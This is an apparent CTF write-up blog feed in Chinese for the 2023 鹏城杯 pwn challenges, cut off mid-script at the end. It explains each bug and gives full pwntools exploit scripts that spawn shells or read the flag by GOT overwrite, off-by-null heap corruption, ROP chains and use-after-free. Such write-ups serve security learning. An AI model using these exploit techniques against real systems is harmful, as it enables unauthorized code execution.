<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">timestamp = <span class="number">702012111.637933</span></span><br><span class="line">time_local = time.localtime(timestamp)</span><br><span class="line">dt = time.strftime(<span class="string">&quot;%Y-%m-%d %H:%M:%S&quot;</span>,time_local)</span><br></pre></td></tr></table></figure>

<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20231108183621934.png" alt="image-20231108183621934"></p>
]]></content>
      <categories>
        <category>Forensic</category>
      </categories>
  </entry>
  <entry>
    <title>2023 鹏城杯</title>
    <url>/2023/11/16/CTF/2023%E9%B9%8F%E5%9F%8E%E6%9D%AF/</url>
    <content><![CDATA[<h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="6502"><a href="#6502" class="headerlink" title="6502"></a>6502</h3><p>涉及到需要下载Ubuntu18.04的软件包，需要我们先修改&#x2F;etc&#x2F;pat&#x2F;sources.list，然后再找软件包。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">apt-key adv --keyserver keyserver.ubuntu.com --recv-keys 3B4FE6ACC0B21F32</span><br><span class="line">apt-get update</span><br><span class="line"></span><br><span class="line">aptitude search libncurses5</span><br><span class="line">aptitude search libtinfo</span><br><span class="line">aptitude download libncurses5-dbg</span><br><span class="line">aptitude download libtinfo5-dbg</span><br><span class="line">dpkg -x libncurses5-dbg_6.1-1ubuntu1.18.04.1_amd64.deb libncurses5/</span><br><span class="line">dpkg -x libtinfo5-dbg_6.1-1ubuntu1.18.04.1_amd64.deb libtinfo5/</span><br></pre></td></tr></table></figure>

<p>漏洞点在于 STA 和 LDA 指令能够向内存写入和读取数据，并且存在负数向上溢出使得访问到 Got 表中的项目。</p>
<span id="more"></span>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// STA</span></span><br><span class="line">__int64 __fastcall <span class="title function_">write_mem</span><span class="params">(<span class="type">unsigned</span> __int16 addr, <span class="type">char</span> data)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( addr &gt; <span class="number">0xFF</span>u )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( addr &gt; <span class="number">0x1FF</span>u )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( addr &lt;= <span class="number">0xFFF9</span>u )</span><br><span class="line">        *(_BYTE *)(mem_ptr + (__int16)(addr - <span class="number">512</span>) + <span class="number">518</span>) = data;		<span class="comment">// 溢出</span></span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        *(_BYTE *)(mem_ptr + addr - <span class="number">65018</span> + <span class="number">512</span>) = data;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      *(_BYTE *)(mem_ptr + addr - <span class="number">256</span> + <span class="number">256</span>) = data;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    *(_BYTE *)(mem_ptr + addr) = data;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// LDA</span></span><br><span class="line">__int64 __fastcall <span class="title function_">get_mem</span><span class="params">(<span class="type">unsigned</span> __int16 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( DEBUG )</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;(get_mem) reading at: 0x%X\n&quot;</span>, a1);</span><br><span class="line">  <span class="keyword">if</span> ( a1 &lt;= <span class="number">0xFF</span>u )</span><br><span class="line">    <span class="keyword">return</span> *(<span class="type">unsigned</span> __int8 *)(mem_ptr + a1);</span><br><span class="line">  <span class="keyword">if</span> ( a1 &lt;= <span class="number">0x1FF</span>u )</span><br><span class="line">    <span class="keyword">return</span> *(<span class="type">unsigned</span> __int8 *)(mem_ptr + a1 - <span class="number">256</span> + <span class="number">256</span>);</span><br><span class="line">  <span class="keyword">if</span> ( a1 &gt; <span class="number">0xFFF9</span>u )</span><br><span class="line">    <span class="keyword">return</span> *(<span class="type">unsigned</span> __int8 *)(mem_ptr + a1 - <span class="number">65018</span> + <span class="number">512</span>);</span><br><span class="line">  <span class="keyword">if</span> ( DEBUG )</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;(get_mem) parsed: 0x%X\n&quot;</span>, (<span class="type">unsigned</span> <span class="type">int</span>)a1 - <span class="number">512</span>);</span><br><span class="line">  <span class="keyword">return</span> *(<span class="type">unsigned</span> __int8 *)(mem_ptr + (__int16)(a1 - <span class="number">512</span>) + <span class="number">518</span>);			<span class="comment">// 溢出</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>而且两个指令都是基于 IZX 指令实现的，可以从内存中获取间接寻址的偏移，之前卡了好久没有想通的点也是在这。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 <span class="title function_">IZX</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v1; <span class="comment">// [rsp+Ah] [rbp-6h]</span></span><br><span class="line">  __int16 v2; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  v1 = cpu_fetch(cpu);</span><br><span class="line">  v2 = (<span class="type">unsigned</span> __int8)cpu_fetch((<span class="type">unsigned</span> __int8)(cpu2 + v1));</span><br><span class="line">  addr_abs = ((<span class="type">unsigned</span> __int8)cpu_fetch((<span class="type">unsigned</span> __int8)(cpu2 + v1 + <span class="number">1</span>)) &lt;&lt; <span class="number">8</span>) | v2;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>最后整理一下思路，首先通过 LDX 和 STX 向内存中写入想要的偏移，然后利用 LDA 和 STA进行间接寻址找到 Got 表中的数据并写入，同时可以配合 ADC 指令进行数据的加减。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>, os =<span class="string">&#x27;linux&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">sh = process([<span class="string">b&quot;./6502_proccessor&quot;</span>], env = &#123;<span class="string">&quot;LD_PRELOAD&quot;</span> : <span class="string">b&quot;/home/pursue/glibc-all-in-one/libs/2.27-3ubuntu1.6_amd64/libdl.so.2&quot;</span>&#125;)</span><br><span class="line">elf = ELF(<span class="string">&quot;./6502_proccessor&quot;</span>)</span><br><span class="line">libc = sh.libc</span><br><span class="line"></span><br><span class="line">code = flat(<span class="string">b&#x27;\xa2\xf2&#x27;</span>,        <span class="comment"># LDX</span></span><br><span class="line">            <span class="string">b&#x27;\x86\x00&#x27;</span>,        <span class="comment"># STX</span></span><br><span class="line">            <span class="string">b&#x27;\xa2\xde&#x27;</span>,</span><br><span class="line">            <span class="string">b&#x27;\x86\x01&#x27;</span>,</span><br><span class="line">            <span class="string">b&#x27;\xa2\x20&#x27;</span>,</span><br><span class="line">            <span class="string">b&#x27;\x86\x02&#x27;</span>,</span><br><span class="line">            <span class="string">b&#x27;\xa2\x00&#x27;</span>,</span><br><span class="line">            <span class="string">b&#x27;\x86\x03&#x27;</span>,</span><br><span class="line">            <span class="string">b&#x27;\xa2\x02&#x27;</span>,</span><br><span class="line">            <span class="string">b&#x27;\x86\x04&#x27;</span>,</span><br><span class="line">            <span class="string">b&#x27;\xa2\x04&#x27;</span>,</span><br><span class="line">            <span class="string">b&#x27;\xa1\x00&#x27;</span>,        <span class="comment"># LDA</span></span><br><span class="line">            <span class="string">b&#x27;\xa2\x00&#x27;</span>,</span><br><span class="line">            <span class="string">b&#x27;\x81\x00&#x27;</span>,        <span class="comment"># STA</span></span><br><span class="line">            </span><br><span class="line">            <span class="string">b&#x27;\xa2\xf3&#x27;</span>,        <span class="comment"># LDX</span></span><br><span class="line">            <span class="string">b&#x27;\x86\x00&#x27;</span>,        <span class="comment"># STX</span></span><br><span class="line">            <span class="string">b&#x27;\xa2\xde&#x27;</span>,</span><br><span class="line">            <span class="string">b&#x27;\x86\x01&#x27;</span>,</span><br><span class="line">            <span class="string">b&#x27;\xa2\xf4&#x27;</span>,</span><br><span class="line">            <span class="string">b&#x27;\x86\x02&#x27;</span>,</span><br><span class="line">            <span class="string">b&#x27;\xa2\x00&#x27;</span>,</span><br><span class="line">            <span class="string">b&#x27;\x86\x03&#x27;</span>,</span><br><span class="line">            <span class="string">b&#x27;\xa2\x02&#x27;</span>,</span><br><span class="line">            <span class="string">b&#x27;\x86\x04&#x27;</span>,</span><br><span class="line">            <span class="string">b&#x27;\xa2\x04&#x27;</span>,</span><br><span class="line">            <span class="string">b&#x27;\xa1\x00&#x27;</span>,        <span class="comment"># LDA</span></span><br><span class="line">            <span class="string">b&#x27;\xa2\x00&#x27;</span>,</span><br><span class="line">            <span class="string">b&#x27;\x81\x00&#x27;</span>,        <span class="comment"># STA </span></span><br><span class="line"></span><br><span class="line">            <span class="string">b&#x27;\xa2\xf4&#x27;</span>,        <span class="comment"># LDX</span></span><br><span class="line">            <span class="string">b&#x27;\x86\x00&#x27;</span>,        <span class="comment"># STX</span></span><br><span class="line">            <span class="string">b&#x27;\xa2\xde&#x27;</span>,</span><br><span class="line">            <span class="string">b&#x27;\x86\x01&#x27;</span>,</span><br><span class="line">            <span class="string">b&#x27;\xa2\xfc&#x27;</span>,</span><br><span class="line">            <span class="string">b&#x27;\x86\x02&#x27;</span>,</span><br><span class="line">            <span class="string">b&#x27;\xa2\x00&#x27;</span>,</span><br><span class="line">            <span class="string">b&#x27;\x86\x03&#x27;</span>,</span><br><span class="line">            <span class="string">b&#x27;\xa2\x02&#x27;</span>,</span><br><span class="line">            <span class="string">b&#x27;\x86\x04&#x27;</span>,</span><br><span class="line">            <span class="string">b&#x27;\xa2\x04&#x27;</span>,</span><br><span class="line">            <span class="string">b&#x27;\xa1\x00&#x27;</span>,        <span class="comment"># LDA</span></span><br><span class="line">            <span class="string">b&#x27;\xa2\x00&#x27;</span>,</span><br><span class="line">            <span class="string">b&#x27;\x61\x00&#x27;</span>,        <span class="comment"># ADC</span></span><br><span class="line">            <span class="string">b&#x27;\xa2\x00&#x27;</span>,</span><br><span class="line">            <span class="string">b&#x27;\x81\x00&#x27;</span>,        <span class="comment"># STA</span></span><br><span class="line">            )</span><br><span class="line"></span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;code length: \n&#x27;</span>, <span class="built_in">str</span>(<span class="built_in">len</span>(code)))</span><br><span class="line">sh.sendafter(<span class="string">&#x27;code: \n&#x27;</span>, code)</span><br><span class="line">sh.send(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="babyheap"><a href="#babyheap" class="headerlink" title="babyheap"></a>babyheap</h3><p>高版本的off-by-null，需要绕过两个检查：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (__glibc_unlikely (chunksize(p) != prevsize))</span><br><span class="line">        malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size while consolidating&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;corrupted double-linked list&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>不过题目给了我们堆地址，按这样我们就能在分配的堆块里伪造一个堆头，其中的两个指针只要指向自己，也就是伪造的堆块，就能绕过检查。题目很好给我们留了一个tcache，这样就可以打<strong>tcache_perthread_struct</strong>，后面通过stdout泄露栈地址然后ROP。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#encoding = utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> * </span><br><span class="line"></span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">local = <span class="number">2</span></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span> :</span><br><span class="line">	sh = process([<span class="string">b&quot;./ld.so&quot;</span>, <span class="string">b&quot;./babyheap&quot;</span>], env = &#123;<span class="string">&quot;LD_PRELOAD&quot;</span> : <span class="string">b&quot;./libc.so.6&quot;</span>&#125;)</span><br><span class="line"><span class="keyword">elif</span> local == <span class="number">2</span> :</span><br><span class="line">    sh = process(<span class="string">&quot;./babyheap&quot;</span>)</span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">	sh = remote(<span class="string">&quot;172.10.0.7&quot;</span>, <span class="number">10001</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./babyheap&#x27;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"><span class="comment"># libc = ELF(&#x27;./libc.so.6&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(sh)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :sh.send(data)</span><br><span class="line">sa      = <span class="keyword">lambda</span> text, data         :sh.sendafter(text, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :sh.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> text, data         :sh.sendlineafter(text, data)</span><br><span class="line">r       = <span class="keyword">lambda</span> num                :sh.recv(num)</span><br><span class="line">ru      = <span class="keyword">lambda</span> text               :sh.recvuntil(text)</span><br><span class="line">uu32    = <span class="keyword">lambda</span>                    :u32(sh.recvuntil(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span>                    :u64(sh.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">lg      = <span class="keyword">lambda</span> s                  :sh.success(<span class="string">&#x27;\033[32m%s -&gt; 0x%x\033[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line">lgl     = <span class="keyword">lambda</span> s, value           :sh.success(<span class="string">&#x27;\033[32m%s -&gt; 0x%x\033[0m&#x27;</span> % (s, value))</span><br><span class="line"></span><br><span class="line"><span class="comment">#------------------------------------------------------------------------------------------------------#</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size, content</span>):</span><br><span class="line">    sla(<span class="string">&#x27;&gt;&gt;&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&quot;input your name size&quot;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    sla(<span class="string">b&quot;input your name&quot;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, size, content</span>):</span><br><span class="line">    sla(<span class="string">&#x27;&gt;&gt;&#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;input index&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    sla(<span class="string">b&#x27;input your name size&#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    sa(<span class="string">b&#x27;input your name&#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(<span class="string">&#x27;&gt;&gt;&#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;input index\n&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(<span class="string">&#x27;&gt;&gt;&#x27;</span>, <span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;input index\n&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">ru(<span class="string">b&#x27;easier\n&#x27;</span>)</span><br><span class="line">heap_base = <span class="built_in">int</span>(ru(<span class="string">b&#x27;\n1.&#x27;</span>)[:-<span class="number">3</span>], <span class="number">16</span>) - <span class="number">0x2a0</span></span><br><span class="line">lg(<span class="string">&#x27;heap_base&#x27;</span>)</span><br><span class="line"></span><br><span class="line">fake_size = <span class="number">0x1940</span></span><br><span class="line">fake_head = flat(<span class="number">0</span>, fake_size, heap_base + <span class="number">0x2c0</span>, heap_base + <span class="number">0x2c0</span>)</span><br><span class="line">add(<span class="number">0x4f8</span>, fake_head)   <span class="comment"># 0</span></span><br><span class="line">add(<span class="number">0x408</span>, <span class="string">b&#x27;pursue&#x27;</span>)   <span class="comment"># 1</span></span><br><span class="line">add(<span class="number">0x408</span>, <span class="string">b&#x27;pursue&#x27;</span>)   <span class="comment"># 2</span></span><br><span class="line">add(<span class="number">0x408</span>, <span class="string">b&#x27;pursue&#x27;</span>)   <span class="comment"># 3</span></span><br><span class="line">add(<span class="number">0x408</span>, <span class="string">b&#x27;pursue&#x27;</span>)   <span class="comment"># 4</span></span><br><span class="line">add(<span class="number">0x408</span>, <span class="string">b&#x27;pursue&#x27;</span>)   <span class="comment"># 5</span></span><br><span class="line">add(<span class="number">0x4f8</span>, <span class="string">b&#x27;pursue&#x27;</span>)   <span class="comment"># 6</span></span><br><span class="line">add(<span class="number">0x4f8</span>, <span class="string">b&#x27;pursue&#x27;</span>)   <span class="comment"># 7</span></span><br><span class="line">edit(<span class="number">5</span>, <span class="number">0x408</span>, flat(cyclic(<span class="number">0x400</span>), fake_size))</span><br><span class="line">delete(<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x4e8</span>, <span class="string">b&#x27;pursue&#x27;</span>)   <span class="comment"># 6</span></span><br><span class="line">add(<span class="number">0x4a8</span>, <span class="string">b&#x27;pursue&#x27;</span>)   <span class="comment"># 8 -&gt; 1</span></span><br><span class="line">add(<span class="number">0x4a8</span>, <span class="string">b&#x27;pursue&#x27;</span>)   <span class="comment"># 9</span></span><br><span class="line">delete(<span class="number">8</span>)</span><br><span class="line">add(<span class="number">0x4b8</span>, <span class="string">b&#x27;pursue&#x27;</span>)   <span class="comment"># 8</span></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">libc_base = uu64() - <span class="number">0x1ff110</span></span><br><span class="line">lg(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x4a8</span>, <span class="string">b&#x27;pursue&#x27;</span>)   <span class="comment"># 10</span></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">pld = flat(cyclic(<span class="number">0x400</span>), <span class="number">0</span>, <span class="number">0x411</span>, (heap_base + <span class="number">0x10</span>) ^ (heap_base &gt;&gt; <span class="number">12</span>))</span><br><span class="line">edit(<span class="number">10</span>, <span class="built_in">len</span>(pld), pld)</span><br><span class="line">add(<span class="number">0x408</span>, <span class="string">b&#x27;pursue&#x27;</span>)   <span class="comment"># 2</span></span><br><span class="line">add(<span class="number">0x408</span>, flat([<span class="string">b&#x27;\x01\x00&#x27;</span>] * <span class="number">64</span>, [libc_base + libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>]] * <span class="number">64</span>))  <span class="comment"># 3</span></span><br><span class="line">add(<span class="number">0x408</span>, flat(<span class="number">0xfbad1800</span>, [<span class="number">0</span>] * <span class="number">3</span>, libc_base + libc.sym[<span class="string">&#x27;environ&#x27;</span>], libc_base + libc.sym[<span class="string">&#x27;environ&#x27;</span>] + <span class="number">8</span>))</span><br><span class="line">leak_stack = uu64()</span><br><span class="line">lg(<span class="string">&#x27;leak_stack&#x27;</span>)</span><br><span class="line">pld = flat([<span class="string">b&#x27;\x01\x00&#x27;</span>] * <span class="number">64</span>, [leak_stack - <span class="number">0x168</span>] * <span class="number">64</span>)</span><br><span class="line">edit(<span class="number">3</span>, <span class="built_in">len</span>(pld), pld)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(sh, &#x27;tel $rebase(0x0000000000004060) 0x20\n \</span></span><br><span class="line"><span class="comment">#            b *$rebase(0x0000000000001590)&#x27;)</span></span><br><span class="line">add(<span class="number">0x408</span>, flat(<span class="number">0</span>, </span><br><span class="line">                libc_base + <span class="number">0x0000000000026a3e</span>, </span><br><span class="line">                libc_base + libc.search(asm(<span class="string">&#x27;pop rdi; ret&#x27;</span>)).__next__(), </span><br><span class="line">                libc_base + libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>).__next__(),</span><br><span class="line">                libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="silent"><a href="#silent" class="headerlink" title="silent"></a>silent</h3><p>纯粹的栈溢出，没有开 PIE，ROPgadget 过滤一下 add 尝试能不能发现任意地址写的功能，最终发现了一个。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">add dword ptr [rbp - 0x3d], ebx ; nop dword ptr [rax + rax] ; repz ret</span><br></pre></td></tr></table></figure>

<p>同时发现 bss 上有 stdout，利用这条汇编可以改写 stdout 的值为 puts 的地址，再利用 csu 中的汇编可以实现libc基地址的泄露，最后利用ROP进行orw。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">sh = process(<span class="string">&quot;./silent&quot;</span>)</span><br><span class="line">sh = remote(<span class="string">&quot;172.10.0.8&quot;</span>, <span class="number">9999</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./silent&quot;</span>)</span><br><span class="line"><span class="comment"># libc = sh.libc</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># add dword ptr [rbp - 0x3d], ebx ; nop dword ptr [rax + rax] ; repz ret</span></span><br><span class="line">magic = <span class="number">0x00000000004007e8</span></span><br><span class="line"></span><br><span class="line">pld1 = flat(cyclic(<span class="number">0x48</span>),</span><br><span class="line">	<span class="number">0x000000000040095A</span>,</span><br><span class="line">	<span class="number">0xffffffffffc94210</span>,</span><br><span class="line">	<span class="number">0x601020</span> + <span class="number">0x3d</span>,</span><br><span class="line">	<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">	magic,</span><br><span class="line">	<span class="number">0x0000000000400961</span>,</span><br><span class="line">	<span class="number">0x601b10</span>,</span><br><span class="line">	<span class="number">0</span>,</span><br><span class="line">	elf.plt[<span class="string">&#x27;read&#x27;</span>],</span><br><span class="line">	<span class="number">0x0000000000400788</span>,</span><br><span class="line">	<span class="number">0x601b10</span> - <span class="number">8</span>,</span><br><span class="line">	<span class="number">0x0000000000400876</span></span><br><span class="line">)</span><br><span class="line"><span class="comment"># gdb.attach(sh)</span></span><br><span class="line">sh.send(pld1)</span><br><span class="line"></span><br><span class="line">pld2 = flat(</span><br><span class="line">	<span class="number">0x000000000040095A</span>,</span><br><span class="line">	<span class="number">0</span>, <span class="number">1</span>,</span><br><span class="line">	<span class="number">0x601020</span>,</span><br><span class="line">	elf.got[<span class="string">&#x27;alarm&#x27;</span>],</span><br><span class="line">	<span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">	<span class="number">0x0000000000400940</span>,</span><br><span class="line">	<span class="number">0x0000000000400961</span>,</span><br><span class="line">	<span class="number">0x601310</span>,</span><br><span class="line">	<span class="number">0</span>,</span><br><span class="line">	<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>,</span><br><span class="line">	<span class="comment"># 0x0000000000400961,</span></span><br><span class="line">	<span class="comment"># 0x601e20, 0,</span></span><br><span class="line">	<span class="comment"># elf.plt[&#x27;read&#x27;],</span></span><br><span class="line">	<span class="comment"># 0x0000000000400788,</span></span><br><span class="line">	<span class="comment"># 0x601e20 - 8,</span></span><br><span class="line">	<span class="comment"># 0x0000000000400876,</span></span><br><span class="line">	<span class="number">0x0000000000400788</span>,</span><br><span class="line">	<span class="number">0x601a00</span> + <span class="number">0x40</span>,</span><br><span class="line">	<span class="number">0x00000000004008DC</span>,</span><br><span class="line">	<span class="string">b&#x27;./flag\x00\x00&#x27;</span></span><br><span class="line">)</span><br><span class="line"><span class="comment"># gdb.attach(sh)</span></span><br><span class="line">sh.send(pld2)</span><br><span class="line"></span><br><span class="line">libc_base = u64(sh.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>)) - <span class="number">0xe44f0</span></span><br><span class="line">success(<span class="string">&#x27;libc_base: &#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">p_rdi_r = libc_base + <span class="number">0x000000000002164f</span></span><br><span class="line">p_rsi_r = libc_base + <span class="number">0x0000000000023a6a</span></span><br><span class="line">p_rdx_r = libc_base + <span class="number">0x0000000000001b96</span></span><br><span class="line"></span><br><span class="line">pld3 = flat(</span><br><span class="line">	cyclic(<span class="number">0x48</span>),</span><br><span class="line">	p_rdi_r, (<span class="number">0x601b10</span> + <span class="built_in">len</span>(pld2) - <span class="number">8</span>),</span><br><span class="line">	p_rsi_r, <span class="number">0</span>,</span><br><span class="line">	p_rdx_r, <span class="number">0</span>,</span><br><span class="line">	libc_base + <span class="number">0x10fbf0</span>,</span><br><span class="line">	p_rdi_r, <span class="number">3</span>,</span><br><span class="line">	p_rsi_r, <span class="number">0x601e00</span>,</span><br><span class="line">	p_rdx_r, <span class="number">0x30</span>,</span><br><span class="line">	libc_base + <span class="number">0x110020</span>,</span><br><span class="line">	p_rdi_r, <span class="number">1</span>,</span><br><span class="line">	p_rsi_r, <span class="number">0x601e00</span>,</span><br><span class="line">	p_rdx_r, <span class="number">0x30</span>,</span><br><span class="line">	libc_base + <span class="number">0x1100f0</span></span><br><span class="line">)</span><br><span class="line"><span class="comment"># gdb.attach(sh)</span></span><br><span class="line">sh.send(pld3)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="atuo-coffee-sale-machine"><a href="#atuo-coffee-sale-machine" class="headerlink" title="atuo_coffee_sale_machine"></a>atuo_coffee_sale_machine</h3><p>自动售卖咖啡机的程序，但是发现在 admin 用户的修改功能时，没有先把用户的咖啡结构复制过来，也就是没有<code>update(1)</code>，使得我们卖出咖啡后利用这个功能可以将释放的堆块（也就是卖出的咖啡）重新置入用户的咖啡结构中，这样就造成了uaf。思路是利用 uaf 修改 coffee_list 的地址使得输出 got 中的libc，最后再劫持 __free_hook。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#encoding = utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> * </span><br><span class="line"></span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">local = <span class="number">3</span></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span> :</span><br><span class="line">	sh = process([<span class="string">b&quot;./ld.so&quot;</span>, <span class="string">b&quot;./pwn_name&quot;</span>], env = &#123;<span class="string">&quot;LD_PRELOAD&quot;</span> : <span class="string">b&quot;./libc.so.6&quot;</span>&#125;)</span><br><span class="line"><span class="keyword">elif</span> local == <span class="number">2</span> :</span><br><span class="line">    sh = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">	sh = remote(<span class="string">&#x27;172.10.0.9&#x27;</span>, <span class="number">8888</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"><span class="comment"># libc = ELF(&#x27;./libc.so.6&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(sh)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :sh.send(data)</span><br><span class="line">sa      = <span class="keyword">lambda</span> text, data         :sh.sendafter(text, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :sh.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> text, data         :sh.sendlineafter(text, data)</span><br><span class="line">r       = <span class="keyword">lambda</span> num                :sh.recv(num)</span><br><span class="line">ru      = <span class="keyword">lambda</span> text               :sh.recvuntil(text)</span><br><span 